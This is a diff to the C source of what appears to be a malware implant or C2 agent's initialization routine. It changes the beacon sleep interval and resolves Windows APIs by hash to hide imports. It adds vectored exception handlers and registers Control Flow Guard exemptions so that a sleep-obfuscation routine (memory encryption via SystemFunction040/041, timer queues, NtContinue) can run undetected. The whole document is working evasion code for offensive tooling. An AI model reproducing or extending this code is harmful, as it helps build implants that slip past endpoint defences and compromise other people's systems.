@@ -8,7 +8,7 @@
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
 #define CONFIG_KILLDATE   NULL
-#define CONFIG_SLEEP      2
+#define CONFIG_SLEEP      8
 
 FUNC VOID BlackoutInit( 
     PVOID Param
@@ -74,6 +74,8 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.TerminateProcess          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
     Instance()->Win32.GetProductInfo            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
     Instance()->Win32.GetNativeSystemInfo       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
+    // Instance()->Win32.DeleteCriticalSection     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DeleteCriticalSection" )  );
+    // Instance()->Win32.InitializeCriticalSection = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "InitializeCriticalSection" )  );
     Instance()->Win32.DuplicateHandle           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
     Instance()->Win32.GetThreadId               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
     Instance()->Win32.ResumeThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
@@ -87,8 +89,7 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.RtlCaptureContext         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "RtlCaptureContext" )  );
 
     Instance()->Win32.RtlCompareMemory          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
-    Instance()->Win32.RtlZeroMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlZeroMemory" )  );
-    Instance()->Win32.RtlCopyMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
+    Instance()->Win32._RtlCopyMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
     Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
     Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
     Instance()->Win32.RtlAllocateHeap           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
@@ -118,6 +119,11 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.NtQueryInformationThread  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationThread" ) );
     Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
     
+    Instance()->Win32.RtlAddVectoredContinueHandler      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredContinueHandler" ) );
+    Instance()->Win32.RtlAddVectoredExceptionHandler     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredExceptionHandler" ) );
+    Instance()->Win32.RtlRemoveVectoredContinueHandler   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredContinueHandler" ) );
+    Instance()->Win32.RtlRemoveVectoredExceptionHandler  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredExceptionHandler" ) );
+
     Instance()->Win32.RtlCreateTimerQueue       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimerQueue" ) );
     Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
     Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
@@ -231,14 +237,18 @@ FUNC VOID BlackoutInit(
     /*============================[ CFG Routine to SleepObf ]============================*/
 
     if ( CfgCheckEnabled() ) {
+        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32._RtlCopyMemory );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
-        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
-        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
-        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtProtectVirtualMemory );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimer );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimerQueue );
     }
 }
